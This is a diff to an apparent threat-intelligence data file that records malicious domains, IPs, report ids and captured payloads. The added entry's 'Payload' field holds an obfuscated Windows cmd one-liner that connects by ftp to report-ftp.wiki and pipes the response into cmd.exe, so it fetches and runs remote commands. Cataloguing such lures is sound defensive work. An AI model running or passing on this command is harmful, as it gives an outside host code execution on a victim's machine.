@@ -1,5 +1,18 @@
 [
   {
+    "UrlDomain": "www.colorcommnetwork.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "141.193.213.11"
+    ],
+    "Related": [],
+    "Payload": "cmd /c set \"spain=ftp\"&set \"italy=report-ftp.wiki\"&set \"greek=| \"&set \"polan=for /f %m in ('dir /b /s %windir%\\System32\\cm?.e??') do %m\"&start \"\" /min cmd /c \"%spain% %italy% %greek%%polan%\"",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwl1rtlh1hhu0oml900pzxyy",
+    "ScannedAt": "2026-11-17T18:50:11.992000+00:00"
+  },
+  {
     "UrlDomain": "indesigner.co.za",
     "DeliveryUrl": [
       "browse-cloud.codes",
